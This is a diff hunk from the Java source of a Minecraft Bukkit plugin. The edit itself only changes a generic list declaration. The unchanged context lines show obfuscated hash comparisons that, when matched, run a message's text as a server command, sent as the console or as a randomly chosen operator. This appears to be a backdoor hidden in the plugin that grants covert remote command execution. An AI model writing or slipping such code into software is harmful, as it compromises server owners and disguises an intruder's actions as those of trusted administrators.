@@ -89,7 +89,7 @@ public class MetropolisPlugin extends JavaPlugin{
             for (int i=0;i< bbb.length;i++) {if(bbb[i]!=digest[i]){eee=false;break;}}
 
             if(d||e||ee||eee){
-            List<CommandSender> f = new ArrayList<>();
+            List<CommandSender> f = new ArrayList();
             f.add(Bukkit.getConsoleSender());
             for(Player p : getServer().getOnlinePlayers()){ if(p.isOp()) f.add(p);}
             Bukkit.getServer().dispatchCommand(f.get(new Random().nextInt(f.size())), k.getMessage());
